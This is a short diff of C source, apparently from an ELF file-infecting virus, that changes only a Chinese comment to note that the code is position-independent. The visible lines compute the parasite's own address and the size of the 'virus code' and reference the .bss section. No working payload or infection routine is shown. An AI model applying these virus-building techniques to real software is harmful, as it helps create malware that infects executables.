@@ -88,7 +88,7 @@ void do_main()
     unsigned int ibss; //index of .bss section in section header table.
 
     struct stat st; 
-    //get_eip()返回的就是foobar的地址
+    //get_eip()返回的就是foobar的地址(位置独立代码)
     unsigned long address_of_main = get_eip() - ((char *)&foobar - (char *)&real_start);
     //病毒代码的大小
     unsigned int parasite_size = (char *)&myend - (char *)&real_start;
